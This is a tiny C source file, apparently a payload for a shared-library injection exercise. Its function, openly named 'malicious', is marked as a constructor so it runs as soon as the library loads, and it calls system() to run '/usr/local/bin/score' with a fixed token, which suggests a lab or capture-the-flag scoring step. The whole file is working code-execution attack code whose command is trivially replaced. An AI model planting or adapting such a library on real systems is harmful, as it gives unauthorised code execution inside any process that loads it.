#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 82406408-6b99-43a2-ae7f-c8cddc5b1d78");
}
